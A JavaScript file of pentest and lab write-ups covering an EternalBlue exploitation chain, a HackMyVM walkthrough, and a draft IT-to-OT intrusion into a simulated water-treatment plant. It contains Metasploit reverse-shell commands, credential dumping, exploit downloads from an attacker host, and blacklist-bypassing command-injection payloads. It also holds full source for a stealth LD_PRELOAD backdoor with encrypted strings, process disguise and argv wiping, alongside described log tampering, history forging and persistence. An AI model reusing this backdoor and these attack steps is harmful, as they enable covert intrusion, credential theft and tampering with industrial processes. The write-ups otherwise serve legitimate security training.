const writeupsData = [
    
    
   {
    id: 'w8',
    title: 'Enterprise Pentest Sim: EternalBlue Full Chain (MS17-010)',
    date: '2026-08-17',
    category: 'Network Penetration Testing',
    difficulty: 'Medium',
    status: 'Published',
    body: `
    <h3>Scope & Context</h3>
    <p>Black-box penetration test against an enterprise network running real infrastructure — physical servers, IoT cameras, network equipment. Target: a Windows Server 2008 R2 machine hosting multiple business-critical services.</p>


    <h3>Host Discovery</h3>
    <pre><code>sudo arp-scan --localnet</code></pre>
    <p>4 live hosts identified. Vendor fingerprinting via MAC OUI:</p>
    <ul>
        <li><code>192.168.1.[REDACTED]</code> — Huawei (gateway)</li>
        <li><code>192.168.1.[REDACTED]</code> — Hewlett Packard (primary target)</li>
        <li><code>192.168.1.[REDACTED]</code> — VMware (isolated VM, all ports filtered)</li>
        <li><code>192.168.1.[REDACTED]</code> — TP-Link (WAP)</li>
    </ul>


    <h3>Port Scanning & Service Enumeration</h3>
    <pre><code>nmap -Pn -sV -sC -p- -T4 --min-rate 5000 [TARGET]</code></pre>
    <p>Key open ports on the HP server:</p>
    <ul>
        <li>23 — Telnet (Microsoft Windows XP telnetd)</li>
        <li>25/110/143 — Lotus Domino SMTP/POP3/IMAP 8.5.3FP6</li>
        <li>80 — Lotus Domino httpd</li>
        <li>389 — LDAP (<strong>Anonymous bind OK</strong>)</li>
        <li>445 — SMB (Windows Server 2008 R2 SP1, <strong>SMBv1 enabled, signing disabled</strong>)</li>
        <li>3306 — MySQL (unauthorized)</li>
        <li>3389 — RDP (NLA disabled)</li>
        <li>8001 — phpMyAdmin 4.9.7</li>
        <li>8080 — Laravel app (PHP 7.4.13, IIS 7.5)</li>
    </ul>
    <pre><code>smb-security-mode:
  account_used: guest
  message_signing: disabled (dangerous, but default)
SMBv1: True
Null Auth: True</code></pre>


    <h3>Vulnerability Detection — MS17-010</h3>
    <pre><code>nmap -Pn --script smb-vuln-ms17-010 -p445 [TARGET]</code></pre>
    <pre><code>Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|     Disclosure date: 2017-03-14</code></pre>

    <p>Confirmed via netexec — null session accepted, SMBv1 active:</p>
    <pre><code>netexec smb [TARGET] -u '' -p ''

SMB  [TARGET]  445  HRS2  [*] Windows Server 2008 R2 Standard 7601 SP1 x64
                           (signing:False) (SMBv1:True) (Null Auth:True)
SMB  [TARGET]  445  HRS2  [+] HRS2.[REDACTED]\:</code></pre>


    <h3>Exploitation — EternalBlue via Metasploit</h3>
    <pre><code>msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [TARGET]
set LHOST [ATTACKER]
set LPORT 4444
set payload windows/x64/meterpreter/reverse_tcp
run</code></pre>
    <pre><code>[*] Started reverse TCP handler on [ATTACKER]:4444
[+] [TARGET]:445 - Host is likely VULNERABLE to MS17-010!
[+] [TARGET]:445 - Connection established for exploitation.
[*] [TARGET]:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] [TARGET]:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard

[+] =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

[*] Meterpreter session 1 opened ([ATTACKER]:4444 -> [TARGET]:49166)</code></pre>


    <h3>Post-Exploitation</h3>
    <pre><code>meterpreter > getuid
Server username: NT AUTHORITY\\SYSTEM

meterpreter > sysinfo
Computer        : HRS2
OS              : Windows Server 2008 R2 (6.1 Build 7601, Service Pack 1)
Architecture    : x64
System Language : fr_FR
Meterpreter     : x64/windows</code></pre>


    <h3>Credential Dumping</h3>
    <pre><code>meterpreter > hashdump

[REDACTED]:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
[REDACTED]:501:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
[REDACTED]:1004:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
[REDACTED]:1000:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::</code></pre>


    <h3>Hidden Internal Network Discovery</h3>
    <p>The server had a second NIC connected to an internal network completely invisible from outside:</p>
    <pre><code>meterpreter > ipconfig

Ethernet adapter local:
   IP Address  : 110.100.100.[REDACTED]   ← internal network

Ethernet adapter WAN:
   IP Address  : 192.168.1.[REDACTED]     ← external network</code></pre>

    <pre><code>meterpreter > arp

110.100.100.[REDACTED]  00-0c-29-[REDACTED]   ← VMware VM (previously unreachable)
110.100.100.[REDACTED]  [REDACTED]
110.100.100.[REDACTED]  [REDACTED]
... [15 additional internal hosts]</code></pre>


    <h3>Sensitive File Discovery</h3>
    <pre><code>meterpreter > search -f *.pdf -d C:\\
Found 178 results

meterpreter > search -f *password* -d C:\\
Found 7 results</code></pre>


    <h3>Configuration File — Credentials in Plaintext</h3>
    <p>The Laravel application's <code>.env</code> file was found at <code>C:\\inetpub\\wwwroot\\[REDACTED]\\.env</code> and contained database credentials in cleartext:</p>
    <pre><code>DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=[REDACTED]
DB_USERNAME=root
DB_PASSWORD=[REDACTED]

DB_CONNECTION_2=ventef
DB_HOST_2=[REDACTED]
DB_PORT_2=1521
DB_DATABASE_2=xe
DB_USERNAME_2=SYSTEM
DB_PASSWORD_2=[REDACTED]

APP_KEY=base64:[REDACTED]
APP_DEBUG=true</code></pre>


    <h3>Remediation Applied</h3>

    <h4>1. Disable SMBv1 via registry</h4>
    <pre><code>reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters" /v SMB1 /t REG_DWORD /d 0 /f</code></pre>


    <h4>2. Block ports 445 and 139 at host firewall</h4>
    <pre><code>netsh advfirewall firewall add rule name="Block_SMBv1" protocol=TCP dir=in localport=445 action=block
netsh advfirewall firewall add rule name="Block_NetBIOS" protocol=TCP dir=in localport=139 action=block</code></pre>


    <h4>3. Verification — vulnerability no longer exploitable</h4>
    <pre><code>nmap -Pn --script smb-vuln-ms17-010 -p445 [TARGET]

PORT    STATE SERVICE
445/tcp open  microsoft-ds
# No vulnerability block returned — firewall rule blocking probe</code></pre>


    <h4>4. LDAP anonymous bind blocked</h4>
    <pre><code>netsh advfirewall firewall add rule name="Block_LDAP_Anonymous" protocol=TCP dir=in localport=389 action=block</code></pre>
    <p>Pre-fix: a single unauthenticated ldapsearch returned 150+ real employee accounts (names, emails, usernames, org structure). Post-fix: connection refused.</p>




    <p>Happy Hacking :)</p>
    `
},
    
    
    
    
    
    
        {
        id: 'w7',
        title: 'HackMyVM: Calc',
        date: '2026-MM-DD', // ← use your actual date, e.g. '2026-08-02'
        category: 'Web Exploitation',
        difficulty: 'Medium',
        status: 'Published',
        body: `
        <h3>Mapping hostname</h3>
        <pre><code>echo "&lt;target-IP&gt; calc.vm" | sudo tee -a /etc/hosts > /dev/null</code></pre>
        <h3>Enumeration</h3>
        <pre><code>nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn calc.vm</code></pre>
        <p>Open ports:</p>
        <ul>
        <li>22 — SSH</li>
        <li>80 — HTTP (Apache, reverse proxy)</li>
        <li>8080 — HTTP (Tomcat / Spring Boot webapp)</li>
        </ul>
        <p>Port 80 hosts a web application that takes a number input and returns a music track. Intercepting requests in Burp Suite reveals the endpoint:</p>
        <pre><code>GET /api/track/1</code></pre>
        
        <h3>Initial Foothold</h3>
        
        <pre><code>sqlmap -u "http://calc.vm:80/api/track/1*" --batch</code></pre>
        <p>The endpoint is vulnerable to error-based and blind SQL injection (MariaDB).</p>
        <pre><code>sqlmap -u "http://calc.vm:80/api/track/1*" -D calc_db --dump --batch</code></pre>
        <p>Credentials from webapp_users:</p>
        <pre><code>+----+----------------------+----------+
| id | password             | username |
+----+----------------------+----------+
| 1  | JimmyThumb_Calc_2010 | Jimmy    |
+----+----------------------+----------+</code></pre>
        <h3>SSH Access</h3>
        <pre><code>ssh Jimmy@&lt;target-ip&gt;
# Password: JimmyThumb_Calc_2010</code></pre>
        <p>User flag in ~/user.txt.</p>
        <h3>Privilege Escalation</h3>
        <h4>Enumeration as Jimmy</h4>
        <pre><code>id
sudo -l
find / -perm -4000 2>/dev/null
cat ~/TODO.txt</code></pre>
        <p>No sudo rights. TODO file leaks DB credentials, but copy-fail is quicker.</p>
        <h4>copy-fail exploit</h4>
        <p><strong>Attacker:</strong></p>
        <pre><code>git clone https://github.com/tgies/copy-fail-c.git
cd copy-fail-c
make
python3 -m http.server 8015</code></pre>
        <p><strong>Target:</strong></p>
        <pre><code>wget http://&lt;attacker-ip&gt;:8015/exploit
chmod +x exploit
./exploit</code></pre>
        <pre><code>whoami
# root
cat /root/root.txt</code></pre>
        <p>Happy Hacking :)</p>
        `
},
    {
        id: 'w9',
        parentId: null,
        children: ['w9-description' , 'w9-web', 'w9-backdoor', 'w9-enterprise', 'w9-impact' , ],
        title: ' full chain IT to OT intrusion into a simulated water treatment facility',
        date: '2026-09-15',
        category: 'ICS / OT Simulation',
        difficulty: 'Advanced',
        status: 'Draft',
        tags: ['ics', 'ot', 'red team', 'modbus', 'ad'],
        body: `
        <h3>Attack Chain Overview</h3>
        <p>This simulated enterprise attack chain demonstrates how a web foothold can lead to Active Directory compromise and then to an ICS/OT environment.</p>
        `
    },
    {
    id: 'w9-description',
    parentId: 'w9',
    children: [],
    title: 'Engagement Overview',
    date: '2026-09-15',
    category: 'ICS / OT Simulation',
    difficulty: 'Advanced',
    status: 'Draft',
    tags: ['ics', 'ot', 'red team', 'scope', 'overview'],
    body: `
      <h3>Engagement Overview</h3>
      <p><strong>Target:</strong> Meridian Process Controls — a simulated water-treatment operator running a full Purdue-model industrial network.</p>

      <p><strong>Starting position:</strong> External attacker with no prior knowledge of the environment. The only asset reachable from the attacker's position is a single public-facing web server at <code>10.200.50.10</code>.</p>

      <p style="margin: 12px 0;">
        <img src="homepage.png" alt="Meridian Process Controls public homepage — the only externally reachable asset at the start of the engagement" style="max-width: 100%; border: 1px solid #333; border-radius: 6px;">
      </p>

      <p>The homepage is the entire external attack surface. No other host, port, or service is visible. Everything that follows — Active Directory, the enterprise zone, the control network, the engineering workstation, and the PLC — must be discovered and reached by pivoting from this single web tier.</p>

      <h3>Scope</h3>
      <p>The engagement traced a full intrusion path — pivoting from a public-facing web server into the enterprise Active Directory domain, then onto an engineering workstation, and from there into the control network where the PLC operates a live water-tank process. Beyond reaching the PLC, a persistent backdoor was crafted inside the process itself, allowing sustained manipulation of the physical system rather than a one-shot write.</p>

      <p>All activity was confined to a containerized lab environment. Manipulation of the industrial process was controlled, reversible, and produced no real-world impact.</p>

      <h3>Objectives</h3>
      <ul>
        <li>Map the external attack surface starting from a single public IP</li>
        <li>Achieve code execution on the DMZ web tier</li>
        <li>Establish persistent, stealthy command-and-control</li>
        <li>Enumerate and compromise the enterprise Active Directory domain</li>
        <li>Find a path across the IT/OT boundary</li>
        <li>Reach the PLC and produce a controlled physical effect on the water process</li>
        <li>Document every stage with attacker actions and defensive visibility</li>
      </ul>

      <h3>Phases</h3>
      <ul>
        <li><strong>Phase 1 — Web Tier:</strong> External reconnaissance, endpoint discovery, 403 bypass, command injection, root code execution on the DMZ web server.</li>
        <li><strong>Phase 2 — Backdoor Development:</strong> LD_PRELOAD injector, process disguise, argv wipe, AES-encrypted strings, TLS 1.3 command-and-control, multi-vector persistence.</li>
        <li><strong>Phase 3 — Enterprise Enumeration:</strong> SMB, RPC, and LDAP enumeration against the domain controller. Credential recovery, password reuse, domain admin access, and enumeration of all users, groups, and computer accounts.</li>
        <li><strong>Phase 4 — Pivot and Impact:</strong> Discovery of a dual-homed engineering workstation bridging enterprise, control, and OT networks. Desktop access via noVNC. Direct Modbus TCP to the PLC. A persistent manipulator that holds the outlet valve closed — driving the water tank toward overflow and surviving operator correction.</li>
      </ul>

      <h3>Deliverable</h3>
      <p>This report documents the technical path, the trust relationships and misconfigurations that enabled each transition, and the defensive visibility (or lack of it) at every stage. It reflects what a real adversary would find, how far they would get, and where the org's segmentation held — and where it did not.</p>
    `
},
   {
    id: 'w9-web',
    parentId: 'w9',
    children: [],
    title: 'Web Tier — Reconnaissance and Initial Access',
    date: '2026-09-15',
    category: 'ICS / OT Simulation',
    difficulty: 'Advanced',
    status: 'Draft',
    tags: ['ics', 'ot', 'red team', 'web', 'recon', 'rce'],
    body: `
      <h3>Phase 1 — Web Tier: Reconnaissance and Initial Access</h3>
      <p>Starting from an external position with no prior knowledge of the environment, the only visible asset is the public web tier at <code>10.200.50.10</code>. The objective of this phase is to map the external attack surface and achieve code execution on the DMZ web server.</p>

      <h3>1.1 DNS Reconnaissance</h3>
      <pre><code>dig +short @10.200.50.11 meridian-process.com A
dig +short @10.200.50.11 www.meridian-process.com A
dig +short @10.200.50.11 meridian-process.com MX
dig @10.200.50.11 meridian-process.com AXFR</code></pre>
      <pre><code>10.200.50.10
10.200.50.10
10 mail.meridian-process.com.
; Transfer failed.</code></pre>
      <p>Single public IP. Mail exchange points to an internal host. Zone transfer is correctly refused — a control that held.</p>

      <h3>1.2 HTTP Fingerprinting</h3>
      <pre><code>curl -s -i http://www.meridian-process.com/ | head -15</code></pre>
      <pre><code>HTTP/1.1 200 OK
Server: gunicorn
Content-Type: text/html; charset=utf-8
Content-Length: 5567</code></pre>
      <p>Flask application behind gunicorn. No WAF detected. Server header reveals the runtime but no version details.</p>

      <h3>1.3 404 Baseline</h3>
      <p>Before fuzzing, establish the exact response fingerprint for a non-existent endpoint so noise can be filtered later.</p>
      <pre><code>for i in 1 2 3; do
  p="/$(openssl rand -hex 8)"
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://www.meridian-process.com$p")
  size=$(curl -s -o /dev/null -w "%{size_download}" "http://www.meridian-process.com$p")
  hash=$(curl -s "http://www.meridian-process.com$p" | sha256sum | cut -d' ' -f1)
  printf '%-25s code=%s  size=%-6s  hash=%s\\n' "$p" "$code" "$size" "\${hash:0:16}"
done</code></pre>
      <pre><code>/c891649017a91a55         code=404  size=1841    hash=ac5b9c58688919e4
/4d64b55bf16726b7         code=404  size=1841    hash=ac5b9c58688919e4
/89387becfd3a3720         code=404  size=1841    hash=ac5b9c58688919e4</code></pre>
      <p>Stable 404 fingerprint: 1841 bytes, hash <code>ac5b9c...</code>. Any response that does not match this hash is a real endpoint.</p>

      <h3>1.4 Directory and Endpoint Fuzzing</h3>
      <pre><code>ffuf -w ~/wordlists/dirs-large.txt \\
  -u http://www.meridian-process.com/FUZZ \\
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" \\
  -mc 200,301,302,401,403 \\
  -fs 1841 \\
  -rate 10 \\
  -p 0.5-2.0 \\
  -t 5 \\
  -c</code></pre>
      <pre><code>[Status: 403, Size: 1841] /remote.html
[Status: 403, Size: 1841] /diag</code></pre>
      <p>Two endpoints discovered. Both return 403 on GET — restricted but present. The next step is to determine how those restrictions are enforced.</p>

      <h3>1.5 Confirming the 403</h3>
      <pre><code>curl -s -i http://www.meridian-process.com/remote.html | head -5
curl -s -i http://www.meridian-process.com/diag | head -5</code></pre>
      <pre><code>HTTP/1.1 403 FORBIDDEN
Server: gunicorn
Connection: close
Content-Type: text/html; charset=utf-8</code></pre>
      <p>Both endpoints restricted on GET. The natural next question: are they restricted on every method, or only on the one we tried?</p>

      <h3>1.6 Method Fuzzing</h3>
      <p>Send every HTTP method against each endpoint and observe the response.</p>
      <pre><code>for m in GET POST PUT DELETE PATCH HEAD OPTIONS TRACE CONNECT PROPFIND MKCOL COPY MOVE LOCK UNLOCK; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X "$m" --max-time 5 "http://www.meridian-process.com/remote.html")
  printf '%-10s %s\\n' "$m" "$code"
done</code></pre>
      <pre><code>GET        403
POST       200
PUT        403
DELETE     403
PATCH      403
HEAD       403
OPTIONS    403
TRACE      403
CONNECT    403
PROPFIND   403
MKCOL      403
COPY       403
MOVE       403
LOCK       403
UNLOCK     403</code></pre>

      <pre><code>for m in GET POST PUT DELETE PATCH HEAD OPTIONS; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X "$m" --max-time 5 "http://www.meridian-process.com/diag")
  printf '%-10s %s\\n' "$m" "$code"
done</code></pre>
      <pre><code>GET        403
POST       200
PUT        403
DELETE     403
PATCH      403
HEAD       403
OPTIONS    403</code></pre>
      <p>Both endpoints enforce access control <strong>only on GET</strong>. Every other method is unprotected. The developer assumed GET is what visitors use and POST is used by their own application. In both cases the opposite is true — POST carries the functionality, and it is not protected.</p>

      <h3>1.7 Accessing remote.html via POST</h3>
      <pre><code>curl -s -X POST http://www.meridian-process.com/remote.html</code></pre>
      <pre><code>&lt;!--
  Field engineers currently reach the plant via:
    - Plant DMZ jump host : 10.200.30.11
    - Engineering workstation : ews-01.meridian.local
    - Domain controller : dc-01.meridian.local (MERIDIAN.LOCAL)

  Diagnostics tool for field engineers is at /diag. It's currently
  blocked for anonymous browsers (WBS-4471 tracks the SSO work),
  but the POST handler is used by the field tablet app and is
  reachable.

  Vendor portal demo credentials (for the trade-show kiosk):
    username: admin
    password: Meridian2024!
--&gt;</code></pre>
      <p>Two critical findings from one comment block: the internal hostnames and domain name for the enterprise zone, and a hardcoded credential pair. The comment also confirms that <code>/diag</code> accepts POST — corroborating the method-fuzz results.</p>

      <h3>1.8 Accessing diag via POST</h3>
      <pre><code>curl -s -X POST http://www.meridian-process.com/diag</code></pre>
      <p>The diagnostics form renders — a single input asking for a hostname to ping. This is a shell-out target. The endpoint takes user input and passes it to a network utility.</p>

      <h3>1.9 Command Injection</h3>
      <p><strong>Attempt 1 — semicolon separator:</strong></p>
      <pre><code>curl -s -X POST http://www.meridian-process.com/diag \\
  --data-urlencode "host=127.0.0.1; id"</code></pre>
      <pre><code>&lt;div class="alert"&gt;Blocked token: id&lt;/div&gt;</code></pre>
      <p>The application has a token blacklist. The token <code>id</code> is filtered, and so are common shell metacharacters.</p>

      <p><strong>Attempt 2 — obfuscate the blocked token:</strong></p>
      <pre><code>curl -s -X POST http://www.meridian-process.com/diag \\
  --data-urlencode "host=127.0.0.1; w'h'o'am'i"</code></pre>
      <pre><code>root</code></pre>
      <p>The filter splits input on non-alphanumeric characters before matching against the blacklist. It sees <code>w</code>, <code>h</code>, <code>o</code>, <code>am</code>, <code>i</code> — none of which are on the list. The shell, running after the filter, concatenates them back into <code>whoami</code>. Classic filter-vs-parser gap.</p>

      <p><strong>Attempt 3 — newline separator:</strong></p>
      <pre><code>curl -s -X POST http://www.meridian-process.com/diag \\
  --data-urlencode $'host=127.0.0.1\\nid'</code></pre>
      <pre><code>uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</code></pre>
      <p>The <code>;</code> separator was blocked, but a newline is an equally valid command separator in shell. The filter catches <code>;</code> but not <code>\\n</code>.</p>

      <h3>1.10 Root Confirmed</h3>
      <pre><code>curl -s -X POST http://www.meridian-process.com/diag \\
  --data-urlencode $'host=127.0.0.1\\nwhoami; hostname; pwd'</code></pre>
      <pre><code>root
d3635c2760c7
/app</code></pre>
      <p>Execution context is <strong>root</strong>, inside the DMZ web container, working directory <code>/app</code>. Full filesystem access, no privilege escalation needed.</p>

      <h3>Phase 1 Summary</h3>
      <ul>
        <li><strong>F-01</strong> — Internal hostnames, subnets, and domain name leaked in HTML comments (Medium)</li>
        <li><strong>F-02</strong> — Vendor portal credentials hardcoded in a public page (High)</li>
        <li><strong>F-03</strong> — Method-based ACL bypass on <code>/remote.html</code> — protection applied to GET only (High)</li>
        <li><strong>F-04</strong> — Method-based ACL bypass on <code>/diag</code> — protection applied to GET only (High)</li>
        <li><strong>F-05</strong> — Incomplete token blacklist — bypassable via quote splitting (High)</li>
        <li><strong>F-06</strong> — Incomplete metacharacter blacklist — bypassable via newline (High)</li>
        <li><strong>F-07</strong> — Unauthenticated command injection as root in the DMZ web container (Critical)</li>
      </ul>

      <p><strong>Result:</strong> Starting from only a public IP address, root code execution was achieved on the DMZ web server in a single session, using endpoints the application itself exposes and information the application itself leaks in HTML comments. This foothold is the foundation for the enterprise and OT pivot that follows.</p>
    `
},
    {
        id: 'w9-bd',
        parentId: 'w9',
        children: [],
        title: 'Active Directory',
        date: '2026-09-15',
        category: 'ICS / OT Simulation',
        difficulty: 'Advanced',
        status: 'Draft',
        tags: ['ics', 'ot', 'red team', 'ad'],
        body: `
        <h3>Active Directory</h3>
        <p>The web foothold is used to move laterally through the enterprise directory.</p>
        <pre><code>crackmapexec smb [SUBNET] -u '[USER]' -p '[PASSWORD]' --shares</code></pre>
        `
    },
    {
    id: 'w9-backdoor',
    parentId: 'w9',
    children: [],
    title: 'Backdoor Development',
    date: '2026-09-15',
    category: 'ICS / OT Simulation',
    difficulty: 'Advanced',
    status: 'Draft',
    tags: ['ics', 'ot', 'red team', 'backdoor', 'ld_preload', 'alpine', 'musl'],
    body: `
      <h3>Phase 2 — Backdoor Development</h3>
      <p>Thi phase was really disappointing since it didnt illustrate any use of impacket tools. With root code execution in the DMZ web container, the next objective was to establish persistent, stealthy command-and-control that would survive process kills, session drops, and service restarts. This phase documents how the backdoor was built specifically for the target environment and the iterative refinement that got it there.</p>

      <h3>2.1 Target Environment Profile</h3>
      <p>Before writing any code, the target was interrogated using the command injection.</p>
      <pre><code># cat /etc/os-release
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.24.1
PRETTY_NAME="Alpine Linux v3.24"

# basename $(readlink /proc/$$/exe)
busybox

# ps aux
PID   USER     TIME  COMMAND
    1 root      0:00 {gunicorn} /usr/local/bin/python3.12 /usr/local/bin/gunicorn --bind 0.0.0.0:80 --workers 2 --access-logfile - app:app
    7 root      0:00 {gunicorn} /usr/local/bin/python3.12 /usr/local/bin/gunicorn --bind 0.0.0.0:80 --workers 2 --access-logfile - app:app
    8 root      0:00 {gunicorn} /usr/local/bin/python3.12 /usr/local/bin/gunicorn --bind 0.0.0.0:80 --workers 2 --access-logfile - app:app</code></pre>

      <ul>
        <li><strong>OS:</strong> Alpine Linux 3.24</li>
        <li><strong>Shell:</strong> busybox ash (no bash)</li>
        <li><strong>libc:</strong> musl (not glibc)</li>
        <li><strong>Init:</strong> gunicorn as PID 1</li>
        <li><strong>Python:</strong> 3.12 present (gunicorn runtime)</li>
        <li><strong>Extra tools already present:</strong> nmap, smbclient, curl, wget, tcpdump, ssh, impacket</li>
      </ul>

      <h3>2.2 Cross-Compilation for Alpine</h3>
      <p>A binary compiled on the my Arch host (glibc) will not run on Alpine (musl). The toolchain was set up once on the attacker machine:</p>
      <pre><code>$ sudo pacman -S musl</code></pre>
      <p>This provides <code>x86_64-linux-musl-gcc</code>, which produces binaries linking against musl and running natively on Alpine.</p>

      <h3>2.3 Test Environment</h3>
      <p>Every payload was validated on a disposable Alpine environment mirroring the target's OS version before deployment. Shell builtins, busybox quirks, and exec behaviour were all confirmed against a matching Alpine 3.24 userspace.</p>

      <h3>2.4 Backdoor Files</h3>

      <h4>src/hook.c</h4>
      <p><strong>Role:</strong> The core injector. A shared object (<code>.so</code>) that runs code the moment it loads into any process — before that process's own <code>main()</code> executes.</p>
      <p><strong>Key features:</strong></p>
      <ul>
        <li><strong>LD_PRELOAD constructor</strong> — uses <code>__attribute__((constructor))</code> to guarantee execution at load time, without any code in the host binary cooperating.</li>
        <li><strong>Process rename via <code>prctl(PR_SET_NAME)</code></strong> — overwrites the kernel's <code>task_struct-&gt;comm</code> field so the process appears in <code>ps</code> as <code>[kworker/1:0]</code>, indistinguishable from a kernel worker thread.</li>
        <li><strong>Argv wipe</strong> — parses <code>/proc/self/stat</code> fields 48 and 49 (<code>arg_start</code>, <code>arg_end</code>), then zeroes the memory range. Writing to <code>/proc/self/cmdline</code> does not work (it is read-only).</li>
        <li><strong>AES-128-CTR encrypted strings</strong> — paths like <code>/tmp/.b</code>, <code>/tmp/.h</code>, and the process name are stored as ciphertext, decrypted at runtime, and zeroed afterwards. <code>strings</code> on the binary shows nothing.</li>
        <li><strong>Double-fork daemonization</strong> — the grandchild is reparented to PID 1, so the process has no visible parent shell in the process tree.</li>
        <li><strong><code>_HOOKED</code> guard</strong> — an environment variable set before <code>execl</code> so children short-circuit at the top of the constructor. Prevents fork bombs and preserves argv for scripts.</li>
      </ul>
      <pre><code>#include "aes.h"

extern long syscall(long, ...);
extern int fork(void);
extern int execl(const char *, const char *, ...);
extern int setenv(const char *, const char *, int);
extern char *getenv(const char *);
extern int open(const char *, int);
extern long read(int, void *, unsigned long);
extern int close(int);
extern long write(int, const void *, unsigned long);

#define SYS_prctl 157
#define PR_SET_NAME 15

static unsigned char ek[16] = {
    0x84,0xf7,0xe4,0xb5,0x90,0xa4,0xe0,0xe4,0x5b,0x79,0x1f,0x3d,0xd3,0xf1,0x97,0xb5
};

static unsigned char iv_b[16] = {0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11};
static unsigned char iv_h[16] = {0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22};
static unsigned char iv_n[16] = {0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33};
static unsigned char iv_e[16] = {0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44};

static unsigned char ct_b[8]  = {0x91,0x61,0x27,0xa0,0xd9,0xb0,0xfc,0};
static unsigned char ct_h[8]  = {0x2f,0xec,0xa9,0x4f,0x96,0x7f,0x63,0};
static unsigned char ct_n[12] = {0xf7,0x4e,0x7f,0x3a,0x0f,0x32,0x7b,0xdc,0x85,0x3b,0x9f,0};
static unsigned char ct_e[14] = {0xe1,0x61,0x12,0x94,0xcb,0x5a,0x4a,0x75,0x1c,0xa8,0x33,0xdd,0x50,0};

static void get_key(unsigned char *o) {
    for (int i = 0; i &lt; 16; i++) o[i] = ek[i] ^ 0x5a;
}

static void dec(unsigned char *o, unsigned char *c, unsigned char *v, int n) {
    unsigned char k[16];
    get_key(k);
    for (int i = 0; i &lt; n; i++) o[i] = c[i];
    struct AES_ctx x;
    AES_init_ctx_iv(&amp;x, k, v);
    AES_CTR_xcrypt_buffer(&amp;x, o, n);
    o[n] = 0;
    for (int i = 0; i &lt; 16; i++) k[i] = 0;
}

static void rename_self(void) {
    unsigned char n[12];
    dec(n, ct_n, iv_n, 11);
    syscall(SYS_prctl, PR_SET_NAME, n, 0, 0, 0);
    for (int i = 0; i &lt; 12; i++) n[i] = 0;
}

static void wipe_argv(void) {
    int fd = open("/proc/self/stat", 0);
    if (fd &lt; 0) return;
    char b[1024];
    long n = read(fd, b, sizeof(b) - 1);
    close(fd);
    if (n &lt;= 0) return;
    b[n] = 0;
    char *p = b;
    for (char *q = b; *q; q++) if (*q == ')') p = q + 1;
    int f = 2;
    unsigned long as = 0, ae = 0;
    while (*p &amp;&amp; f &lt; 49) {
        while (*p == ' ') p++;
        f++;
        if (f == 48) { while (*p &gt;= '0' &amp;&amp; *p &lt;= '9') as = as*10 + (*p++ - '0'); }
        else if (f == 49) { while (*p &gt;= '0' &amp;&amp; *p &lt;= '9') ae = ae*10 + (*p++ - '0'); }
        else { while (*p &amp;&amp; *p != ' ') p++; }
    }
    if (as &amp;&amp; ae &gt; as) {
        char *s = (char *)as;
        for (unsigned long i = 0; i &lt; ae - as; i++) s[i] = 0;
    }
}

__attribute__((constructor))
static void init(void) {
    rename_self();
    if (getenv("_HOOKED")) return;
    if (fork() != 0) return;
    if (fork() != 0) return;
    wipe_argv();
    unsigned char pb[8], ph[8], pe[14];
    dec(pb, ct_b, iv_b, 7);
    dec(ph, ct_h, iv_h, 7);
    dec(pe, ct_e, iv_e, 13);
    setenv("_HOOKED", "1", 1);
    setenv("LD_PRELOAD", (char *)ph, 1);
    execl("/bin/bash", (char *)pe, (char *)pb, (char *)0);
}

int main(void) { return 0; }
</code></pre>

      <h4>src/backdoor.sh</h4>
      <p><strong>Role:</strong> The post-injection payload. Runs as bash after the constructor loads. Sets up cleanup, persistence, and the reconnect loop.</p>
      <p><strong>Key features:</strong></p>
      <ul>
        <li><strong>Log cleanup</strong> — removes the attacker IP and any tool-related keywords from <code>/var/log/apk.log</code>.</li>
        <li><strong>Timestomping</strong> — <code>touch -r /bin/busybox</code> backdates cleaned files to match the container's build time, defeating <code>find -newer</code> checks.</li>
        <li><strong>History replacement</strong> — overwrites <code>/root/.ash_history</code> with a plausible benign admin session, then timestomps it.</li>
        <li><strong>History suppression</strong> — <code>export HISTFILE=/dev/null</code> prevents the current shell and all children from writing any new commands to history.</li>
        <li><strong>PID file</strong> — writes its own PID to <code>/tmp/.pid</code> so the watchdog and <code>.pth</code> handler can check liveness without <code>pgrep</code> (which self-matches and causes recursion).</li>
        <li><strong>Python <code>.pth</code> persistence</strong> — writes a single-line <code>import</code> handler to <code>site-packages/persist.pth</code>. Python executes this on every interpreter startup. Combined with <code>_PYHOOK</code> env guard, prevents recursion.</li>
